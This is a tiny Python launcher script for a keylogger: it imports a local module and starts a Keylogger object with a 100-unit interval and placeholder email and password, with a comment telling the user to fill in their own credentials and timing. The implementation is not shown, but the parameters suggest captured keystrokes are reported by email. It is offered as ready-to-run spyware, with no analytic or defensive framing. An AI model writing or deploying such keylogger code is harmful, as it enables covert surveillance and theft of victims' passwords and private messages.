#!/usr/bin/env python
import main

#change the email and password. you can either change the time stemp.
my_keylogger = main.Keylogger(100, "email", "password")
my_keylogger.start()

